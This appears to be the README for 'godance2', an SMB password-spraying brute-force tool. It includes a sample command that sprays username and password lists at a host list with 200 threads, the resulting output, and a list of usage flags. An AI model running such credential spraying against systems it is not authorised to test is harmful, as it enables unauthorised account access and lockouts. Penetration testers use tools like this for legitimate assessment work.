```
  ___ ____  ___/ /__ ____  _______    
 / _ '/ _ \/ _  / _ '/ _ \/ __/ -_)   
 \_, /\___/\_,_/\_,_/_//_/\__/\__/     2: Electric Boogaloo
/___/
```


# godance2 - A password spraying SMB bruteforcer

SMB password sprayer
now with ability to spray across a host list

```
$ godance -h <hostlistfile.txt> -u users.txt -w passwords.txt -d WORKGROUP -t 200   
 
  ___ ____  ___/ /__ ____  _______    
 / _ '/ _ \/ _  / _ '/ _ \/ __/ -_)   
 \_, /\___/\_,_/\_,_/_//_/\__/\__/    
/___/

-----------------------------------------------------
 [*] Number of usernames: 4242
 [*] Number of passwords: 4
 [*] Test cases: 16968
 [*] Number of threads: 200
-----------------------------------------------------
 [*] Host: 1.1.1.1 // Username: pystyy // Password: vetaa

```

## Usage


```
Usage of godance:
  -d string
        Domain (default "WORKGROUP")
  -h string
        Target hostlist - text file
  -p int
        Target port (default 445)
  -s string
        Sleep time in seconds (per thread)
  -t int
        Number of threads (default 10)
  -u string
        User wordlist
  -v    Debug
  -w string
        Password list
```

## Installation

  --Download
  --Build with Go
  -- Go!

